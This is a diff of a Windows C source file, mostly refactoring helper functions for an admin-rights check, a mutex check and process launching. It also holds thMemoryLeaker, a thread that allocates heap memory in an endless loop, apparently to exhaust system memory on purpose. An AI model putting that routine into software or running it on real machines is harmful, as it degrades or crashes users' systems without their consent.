@@ -14,14 +14,14 @@
 
 BOOL fnIsUserAdmin(VOID) {
 	SID_IDENTIFIER_AUTHORITY siaSNtA = SECURITY_NT_AUTHORITY;
-	PSID psAg;
-	BOOL bAais = AllocateAndInitializeSid(&siaSNtA, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &psAg);
+	PSID pSid;
+	BOOL bAais = AllocateAndInitializeSid(&siaSNtA, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSid);
 	if (bAais) {
-		if (!CheckTokenMembership(NULL, psAg, &bAais)) {
+		if (!CheckTokenMembership(NULL, pSid, &bAais)) {
 			bAais = FALSE;
 		}
 
-		FreeSid(psAg);
+		FreeSid(pSid);
 	}
 
 	return bAais;
@@ -30,9 +30,9 @@ BOOL fnIsUserAdmin(VOID) {
 DWORD WINAPI thMemoryLeaker(
 	_In_ LPVOID lpParam
 ) {
-	HANDLE hHeap = HeapCreate(NULL, 0, NULL);
+	HANDLE hHeap = HeapCreate(NULL, 0x2000, NULL);
 	if (hHeap) {
-		for (;;) {
+		while (TRUE) {
 			HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x2000);
 			Sleep(100);
 		}
@@ -44,9 +44,9 @@ DWORD WINAPI thMemoryLeaker(
 
 #if SYNCHRONIZATION == TRUE
 BOOL fnCheckMutexW(
-	_In_ LPCWSTR lpName
+	_In_ LPCWSTR lpMutexName
 ) {
-	if (OpenMutex(SYNCHRONIZE, FALSE, lpName)) {
+	if (OpenMutex(SYNCHRONIZE, FALSE, lpMutexName)) {
 		return TRUE;
 	} else {
 		fnMessageHandlerW(NULL, L"Couldn't Open Mutex", L"OpenMutexW", MB_ICONERROR);
@@ -55,26 +55,33 @@ BOOL fnCheckMutexW(
 }
 #endif // SYNCHRONIZATION
 
-BOOL fnCreateProcessW(
-	_In_ LPCWSTR lpFileName,
-	_In_ LPCWSTR lpCommandLine,
-	_In_ DWORD   dwCreationFlags,
-	_In_ LPCWSTR lpCurrentDirectory
+BOOL fnCreateProcessExW(
+	_In_     LPCWSTR lpFileName,
+	_In_opt_ LPCWSTR lpCommandLine,
+	_In_opt_ DWORD   dwCreationFlags,
+	_In_opt_ LPCWSTR lpDirectory
 ) {
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
-	LPWSTR lpCommandLineC = _wcsdup(lpCommandLine);
 
-	if (CreateProcess(lpFileName, lpCommandLineC, NULL, NULL, FALSE, dwCreationFlags, NULL, lpCurrentDirectory, &si, &pi)) {
+	LPWSTR lpCommandLineC;
+	if (lpCommandLine) {
+		lpCommandLineC = _wcsdup(lpCommandLine);
+	} else {
+		lpCommandLineC = NULL;
+	}
+
+	if (CreateProcess(lpFileName, lpCommandLineC, NULL, NULL, FALSE, dwCreationFlags, NULL, lpDirectory, &si, &pi)) {
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 		free(lpCommandLineC);
 		return TRUE;
 	} else {
-		fnMessageHandlerW(NULL, L"Couldn't launch Process\nFile: %s\nCommandLine: %s", L"CreateProcessW", MB_ICONERROR, lpFileName, lpCommandLine);
+		fnMessageHandlerW(NULL, L"Couldn't launch Process\nFile: %s\nCommandLine: %s\nDirectory: %s", L"CreateProcessW",
+			MB_ICONERROR, lpFileName, lpCommandLine, lpDirectory);
 		free(lpCommandLineC);
 		return FALSE;
 	}
@@ -82,7 +89,7 @@ BOOL fnCreateProcessW(
 
 BOOL fnShellExecuteExW(
 	_In_opt_ LPCWSTR lpVerb,
-	_In_     LPCWSTR lpFile,
+	_In_     LPCWSTR lpFileName,
 	_In_opt_ LPCWSTR lpParameter,
 	_In_opt_ LPCWSTR lpDirectory,
 	_In_opt_ INT     nShow,
@@ -93,7 +100,7 @@ BOOL fnShellExecuteExW(
 	ei.cbSize = sizeof(ei);
 
 	ei.lpVerb = lpVerb;
-	ei.lpFile = lpFile;
+	ei.lpFile = lpFileName;
 	ei.lpParameters = lpParameter;
 	ei.lpDirectory = lpDirectory;
 	ei.nShow = nShow;
@@ -105,7 +112,8 @@ BOOL fnShellExecuteExW(
 		}
 		return TRUE;
 	} else {
-		fnMessageHandlerW(NULL, L"Couldn't launch File\nFile: %s", L"ShellExecuteExW", MB_ICONERROR, lpFile);
+		fnMessageHandlerW(NULL, L"Couldn't launch File\nFile: %s\nCommandLine: %s\nDirectory: %s", L"ShellExecuteExW",
+			MB_ICONERROR, lpFileName, lpParameter, lpDirectory);
 		return FALSE;
 	}
 }
